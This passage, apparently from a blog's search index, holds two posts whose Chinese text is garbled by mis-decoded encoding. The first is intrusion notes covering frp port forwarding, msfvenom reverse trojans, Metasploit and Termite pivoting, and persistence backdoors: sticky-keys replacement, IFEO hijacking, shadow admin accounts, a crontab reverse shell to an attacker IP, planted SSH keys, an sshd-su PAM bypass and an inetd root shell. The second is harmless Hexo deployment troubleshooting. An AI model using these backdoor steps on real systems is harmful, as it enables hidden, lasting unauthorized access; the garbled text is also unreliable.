·æ•°æ®å‘åˆ°è¾¹ç•Œæœºçš„è¯¥ç«¯å£å°±ç›¸å½“äºå‘åˆ°å¤–ç½‘kaliï¼Œè€Œç«¯å£è½¬å‘frpsåœ¨è¾¹ç•Œæœºã€frpcåœ¨å¤–ç½‘kaliã€‚å¦ä¸€ç§æ–¹å¼æ˜¯å†…ç½‘ç©¿é€ï¼ŒæŠŠå†…ç½‘æµé‡ç›´æ¥ç©¿é€åˆ°å¤–ç½‘ä½¿å¾—å†…ç½‘æœºèƒ½ä¸Šç½‘ï¼Œfrpsä¹Ÿåœ¨è¾¹ç•Œæœºï¼Œfrpcåœ¨å†…ç½‘æœºã€‚</strong></p><p>å¯ä»¥ç†è§£ä¸ºéƒ½æ˜¯ç«¯å£è½¬å‘ï¼Œ<strong>è®¿é—®frpsæ‰€åœ¨ä¸»æœºå°±ç›¸å½“äºè®¿é—®frpc</strong>ï¼Œæ‰€ä»¥<strong>frpsä¸€å®šè¦åœ¨ä¸­é—´çš„æœºå™¨ä¸Š</strong>ã€‚é€»è¾‘ç†ä¸é€šå»ºè®®åå¤è¯»æ¥å›è¯»è¯»é€šè¯»é€ã€‚æœ‰å¾ˆå¤šæ–‡ç« å•Šå°±ä¸ä»‹ç»ç«¯å£è½¬å‘å’Œå†…ç½‘ç©¿é€æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œæ•´åŠå¤©éƒ½ä¸çŸ¥é“frpsæ”¾å“ªï¼Œè™½ç„¶åªå­¦å†…ç½‘ç©¿é€å°±å¤Ÿå¤–ç½‘æ‰“å†…ç½‘ä¸€æ‹›é²œäº†ã€‚</p><p>ä¸Šä¼ frpå’Œiniæ–‡ä»¶ï¼Œè¿è¡Œã€‚é‡æ–°msfvenomeç”Ÿæˆä¸€ä¸ªreverseæœ¨é©¬ï¼ŒlhostæŒ‡å‘è¾¹ç•Œæœº lportä¹Ÿæ˜¯è¾¹ç•Œæœºè¦å¼€çš„ç«¯å£ã€‚(æœ¨é©¬çš„lhostæŒ‡çš„æ˜¯éœ€è¦è¿æ¥çš„ip,ä¸æ˜¯æŒ‡ä¸Šä¼ çš„ip)<br>ä¸Šä¼ æœ¨é©¬åˆ°äºŒå±‚è¾¹ç•Œæœºè¿è¡Œï¼Œå†åœ¨è¾¹ç•Œæœºshellé‡Œå¼€ç›‘å¬(ç›‘å¬msfæœ¨é©¬lport)</p><h2 id="äºŒå±‚ä»£ç†"><a href="#äºŒå±‚ä»£ç†" class="headerlink" title="äºŒå±‚ä»£ç†"></a>äºŒå±‚ä»£ç†</h2><ul><li>msfå¼€äºŒå±‚ä»£ç†ï¼Œåœ¨åˆšåœ¨ç›‘å¬çš„shellé‡Œ<code>use auxiliary/server/socks5</code>ï¼Œç„¶å<code>run</code>è¿è¡Œ</li><li>å¯¹ä¹‹å‰arpæ‰«æçš„ä¸»æœº<code>use auxiliary/scanner/portscan/tcp</code>æ‰«æç«¯å£ï¼Œè®¾ç½®rhostå‚æ•°ï¼Œå‡†å¤‡å†å¾€é‡Œæ‰“</li><li>é…ç½®æµè§ˆå™¨ä»£ç†ï¼Œé€‰socks5ï¼Œç«¯å£å’Œsocks5è„šæœ¬show optionsçš„ç«¯å£ä¸€è‡´</li><li>è®¿é—®ä¸‰å±‚å†…ç½‘æœºçš„80ç«¯å£ï¼Œå‡†å¤‡ä¸‰å±‚å†…ç½‘æ¸—é€(æ‰“80ç«¯å£)</li></ul><p>äºŒå±‚æ¸—é€å°±æå®šäº†ã€‚å¦‚æœä¸‰å±‚å†…ç½‘è¦å‡ºç½‘ç»è¿‡äºŒå±‚å†…ç½‘ã€‚ç”¨bindçš„è¯è¿˜å¥½ï¼Œç”¨reverseå°±éœ€è¦ç”¨ä¸¤æ¬¡ä»£ç†è½¬å‘</p><p>ç®€å•æä¸€ä¸‹<strong>ä¸‰å±‚å†…ç½‘</strong>ï¼Œå¯ä»¥ä¸Šä¼ lcxå†è¿›è¡Œä¸€æ¬¡ç«¯å£è½¬å‘ï¼ŒæŠŠäºŒå±‚å†…ç½‘æœºçš„frpç«¯å£è½¬å‘åˆ°è¾¹ç•Œæœºï¼Œæˆ–è€…èµ°frpä»£ç†ã€‚è¿™æ ·éƒ½æ˜¯frpç«¯å£å°±ä¸²èµ·æ¥äº†ï¼Œå†æŠŠä¸‰å±‚å†…ç½‘æœºreverseåˆ°äºŒå±‚çš„ç«¯å£ç­‰äºäºŒå±‚è½¬å‘çš„ç«¯å£ï¼Œç›¸å½“äºç›´æ¥reverseå‡ºå»</p><p>æ‰€ä»¥ï¼å¤šå±‚ä»£ç†å°±æ˜¯æŠŠå¤šå±‚ä¸»æœºç«¯å£ä¸²èµ·æ¥ï¼</p><p>ä»€ä¹ˆï¼Ÿæ‹¿å®Œshellï¼Œå‡ å°æœºå­çš„shellæ¥å›åˆ‡ä½ å«Œéº»çƒ¦ï¼Ÿå¯ä»¥ç›´æ¥ç”¨Termiteå·¥å…·</p><h1 id="Termite"><a href="#Termite" class="headerlink" title="Termite"></a>Termite</h1><p>Termiteç”¨äºç®¡ç†å¤šå±‚è·³æ¿ï¼Œæœ‰adminå’Œagentä¸¤ä¸ªæ–‡ä»¶ã€‚</p><ul><li>åœ¨ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ä¸Šä¼ agentçš„å¯¹åº”ç‰ˆæœ¬ï¼Œè¿è¡Œ<code>./agent_ç‰ˆæœ¬ -l ç«¯å£</code></li><li>åœ¨æ”»å‡»æœºè¿è¡Œ<code>adminçš„å¯¹åº”ç‰ˆæœ¬ -c è¾¹ç•Œæœºip -p ç«¯å£</code>ï¼Œè¿æ¥æ²¡é—®é¢˜å°±è·³ok</li><li>adminçš„shellé‡Œ<code>goto 1</code>è¿›å…¥ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ï¼Œ<code>shell ç«¯å£</code>ã€‚ç„¶åèµ·ä¸ªç»ˆç«¯å¼€ncæˆ–è€…å…¶ä»–ç›‘å¬ï¼Œç›‘å¬è¯¥ç«¯å£ï¼Œå¼¹å›äº†ç¬¬ä¸€ä¸ªshell</li><li>äºŒå±‚æœºå™¨<code>agentå¯¹åº”ç‰ˆæœ¬ -c ä¸Šä¸€å±‚ip -p ä¸Šä¸€å±‚ç«¯å£</code>ã€‚ç«¯å£ä¸å‰é¢å¼€agentå’Œadminçš„ç«¯å£ä¸€è‡´ã€‚</li></ul><p>å°ç«™æƒé™ç»´æŒå¤§éƒ¨åˆ†è¿˜æ˜¯é webshellåé—¨ï¼Œå…¶ä»–çš„å¯ä»¥ï¼Œä½†æ²¡å¿…è¦ã€‚è¿˜æœ‰æç«™æœ€å¥½åˆ«åœ¨æ™šä¸Šæï¼Œæ™šä¸Šæµé‡å°‘ï¼Œæç«™æ—¥å¿—è®°å½•å’Œæµé‡å æ¯”å¾ˆå¤§ã€‚å› è€Œå†™çš„å¥½çš„æœ¨é©¬æµé‡æ§åˆ¶åšçš„å¾ˆå¥½ï¼Œä¸Šä¼ å’Œä¸‹è½½é€Ÿåº¦éƒ½æœ‰æ§åˆ¶</p><h1 id="æƒé™ç»´æŒ"><a href="#æƒé™ç»´æŒ" class="headerlink" title="æƒé™ç»´æŒ"></a>æƒé™ç»´æŒ</h1><p>æƒé™ç»´æŒä¸ä¸€å®šæ˜¯é«˜æƒé™ã€‚åé—¨æœ€å¥½éƒ½è¦ä¼ªè£…ï¼Œå¦‚å¯åŠ¨ï¼Œå›¾æ ‡ï¼Œåå­—ã€‚ç»è¿‡å­¦ä¹ ä¸ªäººè®¤ä¸ºæƒé™ç»´æŒ&#x3D;éšè—åé—¨</p><h2 id="windowsåé—¨"><a href="#windowsåé—¨" class="headerlink" title="windowsåé—¨"></a>windowsåé—¨</h2><p>å¸¸è§çš„åé—¨ï¼šshiftåé—¨ï¼Œå¯åŠ¨é¡¹&#x2F;è®¡åˆ’ä»»åŠ¡ï¼Œæ˜ åƒåŠ«æŒï¼Œå½±å­è´¦æˆ·ï¼Œè¿œæ§<br>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œåé—¨æ˜¯ä¸€ä¸ªéšè—è¿›ç¨‹ã€‚</p><ul><li>shiftåé—¨</li></ul><blockquote><p>windowsæŒ‰äº”ä¸‹shiftåï¼Œwindowså°±è¿è¡Œäº†system32ä¸‹çš„sethc.exeï¼Œå¯åŠ¨ç²˜æ»é”®ã€‚</p><blockquote><p>å°†cmd.exeæ›´åä¸ºsethc.exeå¹¶æŠŠåŸæ¥çš„æ›¿æ¢ï¼Œä¹‹åè¿ç»­æŒ‰ä¸‹5æ¬¡shiftåå°±ä¼šä»¥systemæƒé™è¿è¡Œcmd.exeï¼Œä¹‹ååªè¦åˆ©ç”¨cmdå¢åŠ ä¸€ä¸ªadministatorå°±å¯ä»¥ç™»å½•</p></blockquote></blockquote><p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿æ¥ä¸Š3389ä¹‹åå¯ä»¥ä½¿ç”¨çš„åŠŸèƒ½ä¸æ­¢shiftï¼Œè¿˜æœ‰æ”¾å¤§é•œç­‰å¯ä»¥æ›¿æ¢ã€‚</p><ul><li>æ˜ åƒåŠ«æŒ<br>ç°åœ¨å¾ˆéš¾ä½¿ç”¨äº†ï¼Œåœ¨é«˜ç‰ˆæœ¬çš„windowsç‰ˆæœ¬ä¸­æ›¿æ¢çš„æ–‡ä»¶å—åˆ°äº†ç³»ç»Ÿä¿æŠ¤ï¼Œæ‰€ä»¥è¦æ˜ åƒåŠ«æŒã€‚<br>a.exeå®é™…æ‰“å¼€æ˜¯b.exeï¼Œå°±æ˜¯åŠ«æŒ</li></ul><blockquote><p>æ˜ åƒåŠ«æŒä¹Ÿç§°IFEOï¼Œæ˜¯ä¸ºä¸€äº›åœ¨é»˜è®¤ç³»ç»Ÿç¯å¢ƒä¸­è¿è¡Œæ—¶å¯èƒ½å¼•å‘é”™è¯¯çš„ç¨‹åºæ‰§è¡Œæä¾›ç‰¹æ®Šçš„ç¯å¢ƒè®¾å®šã€‚é»˜è®¤ç®¡ç†å‘˜æœ‰æƒè¯»å†™</p><blockquote><p>æ˜ åƒåŠ«æŒçš„åˆ¶ä½œè¿‡ç¨‹</p></blockquote><blockquote><ol><li>åœ¨æ³¨å†Œè¡¨ä¸­æ–°å»ºä¸€ä¸ªé¡¹<br>æ³¨å†Œè¡¨ä½ç½®<code>HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options</code></li><li>ç¨‹åºä¸­æ·»åŠ debuggeré”®</li><li>é”®å€¼è®¾ç½®ä¸ºæ¶æ„ç¨‹åºçš„è·¯å¾„</li></ol></blockquote></blockquote><ul><li>è®¡åˆ’ä»»åŠ¡åé—¨<br>è®¡åˆ’ä»»åŠ¡åœ¨win7åŠä¹‹å‰ç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿä¸­ä½¿ç”¨atå‘½ä»¤ï¼Œwin8åŠä¹‹åä½¿ç”¨schtaskså‘½ä»¤</li></ul><blockquote><p>åˆ›å»ºè®¡åˆ’ä»»åŠ¡åŸºæœ¬å‘½ä»¤: <code>schtask /create /t &quot;chrom&quot; /tr cmd.exe /sc minute /mo 1</code><br>ä¸Šè¿°å‘½ä»¤çš„æ„æ€ä¸ºåˆ›å»ºä¸€ä¸ªè®¡åˆ’ä»»åŠ¡åå­—ä¸ºchromï¼Œæ‰§è¡Œcmd.exeæ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ã€‚æ‰§è¡Œåé—¨å°±æ”¹æŒ‡å‘æ–‡ä»¶å’Œæ‰§è¡Œé¢‘ç‡</p></blockquote><ul><li>æ³¨å†Œè¡¨è‡ªå¯åŠ¨åé—¨</li></ul><blockquote><p>åˆ¶ä½œè¿‡ç¨‹</p><blockquote><ol><li>æ‰“å¼€æ³¨å†Œè¡¨<code>HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run</code></li><li>æ·»åŠ é”®å€¼REG_SZ</li><li>æ•°æ®ä¸­å¡«è¿è¡Œç¨‹åºè·¯å¾„</li></ol></blockquote></blockquote><ul><li>å½±å­è´¦æˆ·(æ€æ¯’èƒ½æ€)<br>é¡¾åæ€ä¹‰éšè—è´¦æˆ·ï¼Œåªèƒ½é€šè¿‡æ³¨å†Œè¡¨æŸ¥çœ‹è¯¥ç”¨æˆ·ã€‚å½±å­è´¦æˆ·å¯ä»¥è·å¾—ç®¡ç†å‘˜æƒé™ä¸”ä¸æ˜“è¢«å‘ç°</li></ul><blockquote><p>åˆ¶ä½œè¿‡ç¨‹</p><blockquote><ol><li>åˆ›å»ºéšè—è´¦æˆ·<br>åˆ›å»ºéšè—è´¦æˆ·åªéœ€åœ¨è´¦æˆ·åååŠ $ç¬¦å·ï¼Œå¦‚<code>net user test$ 123 /add</code></li><li>ä¿®æ”¹å¹¶å¯¼å‡ºæ³¨å†Œè¡¨</li></ol></blockquote><blockquote><blockquote><ul><li>æ³¨å†Œè¡¨ä½ç½®<code>HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/</code>ï¼Œå¦‚è¿›å…¥SAMæ— æ³•çœ‹åˆ°å­é€‰é¡¹ï¼Œéœ€è¦ç»™administratorså®Œå…¨æ§åˆ¶æƒé™</li><li>å°†administratorç”¨æˆ·çš„Få€¼å¤åˆ¶åˆ°test$å¯¹åº”Få€¼ï¼Œä¿å­˜</li><li>å°†test$å’Œuserså³é”®å¯¼å‡º</li></ul></blockquote></blockquote><blockquote><ol start="3"><li>åˆ é™¤åˆ›å»ºçš„éšè—ç”¨æˆ·<br>cmdåˆ é™¤test$<code>net user test$ /del</code></li><li>å¯¼å…¥æ³¨å†Œè¡¨<br>åŒå‡»å¯¼å‡ºçš„ä¸¤ä¸ªæ³¨å†Œè¡¨</li></ol></blockquote></blockquote><p>å½±å­è´¦æˆ·è¯•äº†ä¸€ä¸‹ï¼Œè¿˜æ˜¯å¾ˆç‰›é€¼çš„ã€‚</p><h2 id="linuxåé—¨"><a href="#linuxåé—¨" class="headerlink" title="linuxåé—¨"></a>linuxåé—¨</h2><ul><li>è®¡åˆ’ä»»åŠ¡åé—¨(crontabåé—¨)</li></ul><blockquote><p>crontabå‘½ä»¤ä»‹ç»<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/c4aaefea-6fc3-436f-b6fa-4773a2e3d455.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/c4aaefea-6fc3-436f-b6fa-4773a2e3d455.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li><p>crontabå‘½ä»¤ç”¨æ¥ç®¡ç†ç”¨æˆ·éœ€è¦å‘¨æœŸæ‰§è¡Œçš„ä»»åŠ¡ã€‚ç­‰äºwindowsè®¡åˆ’ä»»åŠ¡ã€‚crondè¿›ç¨‹æ¯åˆ†é’Ÿä¼šå®šæœŸæ£€æŸ¥æ˜¯å¦æœ‰è¦æ‰§è¡Œçš„ä»»åŠ¡ï¼Œå¦‚æœæœ‰åˆ™è‡ªåŠ¨æ‰§è¡Œ<br>é€šå¸¸åœ¨è®¡åˆ’ä»»åŠ¡ä¸­æ·»åŠ åé—¨ï¼Œæˆ–è€…æ›¿æ¢æœåŠ¡è¿›ç¨‹ï¼Œä»¥åŠåå¼¹shell</p></li><li><p>åå¼¹shell</p></li></ul><blockquote><ol><li>æ”»å‡»æœºç›‘å¬<code>nc -lvvp æœ¬åœ°ç«¯å£å·</code>ã€</li><li>ç›®æ ‡æœºä¸­è®¾ç½®è®¡åˆ’ä»»åŠ¡<code>crontab -e</code><br>ä¸‹åˆ—ä»£ç è¡¨ç¤ºæ¯åˆ†é’Ÿåå¼¹ä¸€æ¬¡shellåˆ°æ”»å‡»æœº<br><code>*/1 * * * * bash -i &gt;&amp; /dev/tcp/æ”»å‡»æœºå¤–ç½‘ip/æ”»å‡»æœºç«¯å£ 0&gt;&amp;1</code></li></ol></blockquote></blockquote><ul><li>sshå…¬é’¥å…å¯†(å¸¸ç”¨)<br>å°†å®¢æˆ·ç«¯ç”Ÿæˆçš„sshå…¬é’¥å†™é“ç›®æ ‡æœåŠ¡å™¨çš„ ~&#x2F;.ssh&#x2F;authorized_keysä¸­ï¼Œä¹‹åå®¢æˆ·ç«¯åˆ©ç”¨ç§é’¥å®Œæˆè®¤è¯å³å¯ç™»å½•ã€‚è¯¥åé—¨æ˜“è¢«å‘ç°</li></ul><blockquote><p>åˆ¶ä½œè¿‡ç¨‹</p><blockquote><ol><li>åœ¨æ”»å‡»æœºä¸Šç”Ÿæˆå…¬é’¥ç§é’¥å¯¹<br><code>ssh-keygen -t rsa</code></li></ol></blockquote><blockquote><blockquote><p>åœ¨ä¸­é€”ä¼šè®©è¾“å…¥å¯†é’¥å¯¹å¯†ç ï¼Œå¦‚æœéœ€è¦å…å¯†ç™»å½•åˆ™å›è½¦è·³è¿‡</p></blockquote></blockquote><blockquote><ol start="2"><li>å°†æ”»å‡»æœº.sshç›®å½•ä¸‹çš„id_rsa.pubå¤åˆ¶åˆ°ç›®æ ‡æœåŠ¡å™¨çš„<code>/root/.ssh/authorized_key</code>æ–‡ä»¶é‡Œ<br><code>scp ~/.ssh/id_rsa.pub root@ç›®æ ‡æœåŠ¡å™¨IPåœ°å€:/root/.ssh/authorized_keys</code><br><img src="https://storage.tttang.com/media/attachment/2022/10/29/e20a4428-9299-4617-9f82-0bf3d3848656.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/e20a4428-9299-4617-9f82-0bf3d3848656.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></li><li>åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸­ï¼Œå°†authorized_keysæƒé™æ”¹ä¸º600<br><code>chmod 600 /root/.ssh/authorized.keys</code></li><li>å°è¯•å…å¯†ç™»å½•</li></ol></blockquote></blockquote><p>è¯¦æƒ…è¯·è§sshç™»å½•è¯¦è§£</p><ul><li>sshè½¯è¿æ¥åé—¨<br>éå¸¸ç»å…¸çš„åé—¨ï¼Œç›´æ¥å¯¹sshdå»ºç«‹è½¯è¿æ¥ï¼Œä¹‹åå°±èƒ½ç”¨ä»»æ„å¯†ç ç™»å½•</li></ul><blockquote><p>è½¯è¿æ¥åé—¨çš„åŸç†æ˜¯åˆ©ç”¨äº†<strong>PAMé…ç½®</strong>æ–‡ä»¶çš„ä½œç”¨ï¼Œå°†sshdæ–‡ä»¶è½¯è¿æ¥åç§°è®¾ç½®ä¸ºsuï¼Œè¿™æ ·åº”ç”¨åœ¨<strong>å¯åŠ¨</strong>è¿‡ç¨‹ä¸­ä¼šå»PAMé…ç½®æ–‡ä»¶å¤¹ä¸­å¯»æ‰¾æ˜¯å¦å­˜åœ¨å¯¹åº”åç§°çš„é…ç½®ä¿¡æ¯ï¼Œsuåœ¨pam_rootokæ£€æµ‹uid 0å³è®¤è¯æˆåŠŸï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨&#x2F;<strong>etc&#x2F;pam.dä¸­å­˜åœ¨</strong>çš„å…¶ä»–è½¯è¿æ¥åå­—</p></blockquote><p>ç‰¹ç‚¹ï¼š1. éšè”½æ€§å¼±ï¼Œrookit hunterè¿™ç±»é˜²æŠ¤è„šæœ¬å¯ä»¥è½»æ¾æ‰«åˆ°</p><ol start="2"><li>æœ¬åœ°æŸ¥çœ‹ç«¯å£ä¼šæš´éœ²</li><li>èƒ½ç»•è¿‡ä¸€äº›æµé‡ç›‘æ§</li></ol><blockquote><p>åˆ¶ä½œè¿‡ç¨‹</p><blockquote><ol><li>åˆ›å»ºè½¯è¿æ¥ <code>ln -sf /usr/sbin/sshd /tmp/su</code></li><li>è®¾ç½®ç›‘å¬ç«¯å£ã€‚å› ä¸ºæœ¬åœ°æŸ¥çœ‹ç«¯å£å®¹æ˜“æš´éœ²ï¼Œå»ºè®®è®¾ç½®8080ï¼Œ8081ä¼ªè£… <code>/tmp/su -o Port=8080</code><br>è¿è¡Œ&#x2F;tmp&#x2F;suå°±ç­‰äºè¿è¡Œ&#x2F;usr&#x2F;sbin&#x2F;sshd,è¿ä¸ä¸Šå¯ä»¥nmapæ‰«ä¸€ä¸‹,æœ‰é˜²ç«å¢™è¿ä¸ä¸Š</li></ol></blockquote></blockquote><ul><li>inetd&#x2F;xinetdåé—¨(å¾ˆè€å¾ˆè€)<br>ç›‘å¬å¤–éƒ¨ç½‘ç»œè¯·æ±‚(socket)çš„ç³»ç»Ÿå®ˆæŠ¤è¿›ç¨‹<br><strong>å…·ä½“å·¥ä½œè¿‡ç¨‹</strong>ï¼šå½“inetdæ”¶åˆ°ä¸€ä¸ªå¤–éƒ¨è¯·æ±‚åï¼Œä¼šåˆ°é…ç½®æ–‡ä»¶ä¸­æ‰¾åˆ°å®é™…å¤„ç†å®ƒçš„ç¨‹åºï¼Œåœ¨æŠŠsocketäº¤ç»™é‚£ä¸ªç¨‹åºå¤„ç†</li></ul><blockquote><p>inetdåé—¨åˆ¶ä½œ</p><blockquote><ol><li>å‘&#x2F;etc&#x2F;inetd.confæ–‡ä»¶ä¸­åŠ å…¥ä¸€è¡Œ:<code>daytime stream tcp nowait root /bin/bash bash -i</code></li><li>å¼€å¯inetåç”¨ncè¿æ¥:<code>nc -lvvp ç›®æ ‡ip 13</code></li></ol></blockquote></blockquote><p>è¿˜æœ‰prismåé—¨ç­‰åœ¨æœåŠ¡å™¨å®‰è£…è½¯ä»¶çš„ï¼Œææ˜“è¢«å‘ç°</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
          <category> å†…ç½‘ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexoåšå®¢æ­å»º</title>
      <link href="/2021/11/28/hexo-bo-ke-da-jian/"/>
      <url>/2021/11/28/hexo-bo-ke-da-jian/</url>
      
        <content type="html"><![CDATA[<p>å»æ‰å›¾ç‰‡å›¾æ³¨æ­£åˆ™è¡¨è¾¾å¼ï¼š<code>\[[^\]]*\]</code></p><h1 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h1><ol><li><p>hexo dè€æ˜¯å¡ä½ï¼š<code>git config --global http.proxy &#39;socks5://127.0.0.1:10086&#39;</code><br> å’Œ<code>git config --global https.proxy &#39;socks5://127.0.0.1:10086&#39;</code>å¼€ä»£ç†</p></li><li><p>hexo dåéœ€è¦ç­‰ä¸€ä¸¤åˆ†é’Ÿgithubæ¸²æŸ“</p></li><li><p>ç”Ÿæˆå¯†é’¥<code>ssh-keygen -t rsa -C &quot;1958304602@qq.com&quot;</code>ï¼Œç„¶åä¸€è·¯å›è½¦ï¼Œé»˜è®¤å°±è¡Œäº†</p></li><li><p>å›¾ç‰‡å‹ç¼©è½¯ä»¶ï¼šCaesium</p></li><li><p>æŠ¥é”™<code>Template render error: (unknown path)</code> ï¼Œhexoè½¬ä¹‰æ—¶å€™å‘ç”Ÿçš„é”™è¯¯ï¼Œä½ æ–‡ç« ä¸­å¯èƒ½å‡ºç°äº†<code>&#123;&#123;&#125;&#125;</code>ï¼Œ<code>&#123;% %&#125;</code>è¿™ç§hexoæ— æ³•è½¬ä¹‰çš„å­—ç¬¦</p></li></ol><h2 id="commitäº†ä½†æ˜¯workflowä¸€ç›´åœ¨deploy"><a href="#commitäº†ä½†æ˜¯workflowä¸€ç›´åœ¨deploy" class="headerlink" title="commitäº†ä½†æ˜¯workflowä¸€ç›´åœ¨deploy"></a>commitäº†ä½†æ˜¯workflowä¸€ç›´åœ¨deploy</h2><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230629135406086.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230629135406086.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç›´æ¥æŠŠgithub pagesä¸‹çº¿ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230629135518254.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230629135518254.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ‰¾æœ€è¿‘ä¸€æ¬¡éƒ¨ç½²æˆåŠŸçš„é¡µé¢å†å‘å¸ƒä¸€æ¬¡</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230629135544231.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230629135544231.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><hr><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230629135618866.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230629135618866.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å†hexo clean ,hexo då°±æ›´æ–°æˆåŠŸäº†ã€‚</p><p>é—®é¢˜çš„åŸå› åº”è¯¥æ˜¯è¿™æ¬¡å‘å¸ƒæˆåŠŸä¹‹åæœ€è¿‘ä¸€æ¬¡å‘å¸ƒï¼Œé‡Œé¢å†™çš„è¯­æ³•æœ‰é”™è¯¯ï¼Œæ¯”å¦‚å›¾ç‰‡æ²¡æœ‰ä¸Šä¼ ç”¨çš„æœ¬åœ°å›¾ç‰‡ç­‰ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
